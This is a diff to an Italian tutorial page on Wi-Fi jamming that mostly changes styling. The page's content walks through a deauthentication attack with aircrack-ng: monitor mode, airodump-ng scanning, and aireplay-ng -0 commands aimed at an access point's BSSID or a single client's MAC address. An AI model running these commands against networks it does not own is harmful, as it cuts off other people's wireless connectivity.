@@ -14,6 +14,7 @@
 <section>
   <div class="container">
     <Article
+      imgmaxwidth="500px"
       header="Il Jammer"
       meta="Scritto da Andrea Canale e Marco Cellini Venerdì 6 Maggio 2022"
       subtitle="Cos'è un Jammer?"
@@ -46,29 +47,29 @@
     <p>Installiamo la suite di Aircrack sul nostro OS</p>
     <Bash
       command="sudo apt-get install aircrack-ng #Debian e derivate"
-      background="black"
-      commandcolor="green"
+      background="grey"
+      commandcolor="white"
     />
     <Bash
       command="sudo yum install aircrack-ng #Red Hat e derivate"
-      background="black"
-      commandcolor="green"
+      background="grey"
+      commandcolor="white"
     />
     <Bash
       command="sudo pacman -S aircrack-ng #Arch Linux e derivate"
-      background="black"
-      commandcolor="green"
+      background="grey"
+      commandcolor="white"
     />
     <Bash
       command="brew install aircrack-ng #Mac OS"
-      background="black"
-      commandcolor="green"
+      background="grey"
+      commandcolor="white"
     />
     <p>
       Ora prendiamo il nome della nostra scheda Wi-Fi attraverso il seguente
       comando
     </p>
-    <Bash command="iwconfig" background="black" commandcolor="green" />
+    <Bash command="iwconfig" background="grey" commandcolor="white" />
     <p>
       Adesso che sappiamo il nome della scheda, avviamo airmon per mandare la
       nostra scheda di rete in Monitor Mode, una modalità dove possiamo
@@ -78,8 +79,8 @@
     </p>
     <Bash
       command="airmon-ng start wlan0"
-      background="black"
-      commandcolor="green"
+      background="grey"
+      commandcolor="white"
     />
     <p>
       Se il comando non dà errori la nostra scheda è pronta per catturare tutto
@@ -88,8 +89,8 @@
     <p>Iniziamo ad analizzare lo spettro con il seguente comando</p>
     <Bash
       command="airodump-ng wlan0mon #wlan0mon = nome scheda + mon"
-      background="black"
-      commandcolor="green"
+      background="grey"
+      commandcolor="white"
     />
     <!--Immagine di prova, appena arriva un portatile la sostituisco :-) -->
     <img src="/img/airodump.png" alt="airodump" class="pure-img" />
@@ -108,8 +109,8 @@
     </p>
     <Bash
       command="aireplay-ng -0 1 -a 00:14:6C:7E:40:80 wlan0mon # dopo -a mettiamo il BSSID"
-      background="black"
-      commandcolor="green"
+      background="grey"
+      commandcolor="white"
     />
     <p>
       Per un attacco più preciso possiamo mirare ad un client unico e non
@@ -119,8 +120,8 @@
     </p>
     <Bash
       command=" aireplay-ng -0 1 -a 00:14:6C:7E:40:80 -c 00:0F:B5:FD:FB:C2 wlan0mon # dopo -c mettiamo il MAC address del client che vogliamo deautenticare"
-      background="black"
-      commandcolor="green"
+      background="grey"
+      commandcolor="white"
     />
     <p>
       Dopo l'inizio dell'attacco il client inizierà a non ricevere più
